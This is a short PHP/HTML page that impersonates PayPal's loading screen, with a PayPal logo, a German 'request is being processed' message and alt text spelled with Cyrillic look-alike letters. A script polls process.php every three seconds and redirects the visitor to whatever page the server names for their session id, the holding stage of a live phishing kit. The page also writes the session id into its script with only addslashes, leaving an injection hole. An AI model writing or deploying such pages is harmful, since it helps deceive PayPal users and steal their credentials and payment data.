<?php
require_once 'config.php';
 $sid = $_GET['sid'] ?? '';
if (!$sid) { redirect('index.php'); }

 $data = get_session($sid);
if ($data) {
    $data['last_activity'] = time();
    save_session($sid, $data);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #ffffff; height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .loading-wrapper { display: flex; flex-direction: column; align-items: center; text-align: center; width: 100%; max-width: 400px; }
        .paypal-logo { width: 130px; height: auto; max-width: 80%; margin-bottom: 45px; object-fit: contain; }
        .paypal-spinner { width: 30px; height: 30px; border: 2.5px solid #e2e8f0; border-top: 2.5px solid #003087; border-radius: 50%; animation: spin 0.85s linear infinite; margin-bottom: 24px; }
        .status-text { color: #003087; font-size: 15px; font-weight: 500; letter-spacing: -0.2px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @media (max-width: 480px) { .paypal-logo { width: 110px; margin-bottom: 35px; } .status-text { font-size: 14px; } }
    </style>
</head>
<body>
    <div class="loading-wrapper">
        <img class="paypal-logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5RSx4N3Nta8EwHtwbbr2PVdtHByHhIOXOCqOxH0zt1w&s=10" alt="РayРal Logo">
        <div class="paypal-spinner"></div>
        <div class="status-text">Ihre Anfrage wird bearbeitet...</div>
    </div>

    <script>
        const sid = "<?php echo addslashes($sid); ?>";
        
        function checkStatus() {
            fetch('process.php?action=ping&sid=' + sid)
                .then(res => res.json())
                .then(data => {
                    if (data.redirect) {
                        window.location.href = data.redirect + '?sid=' + sid;
                    }
                })
                .catch(err => console.error('Error pinging server'));
        }

        setInterval(checkStatus, 3000);
    </script>
</body>
</html>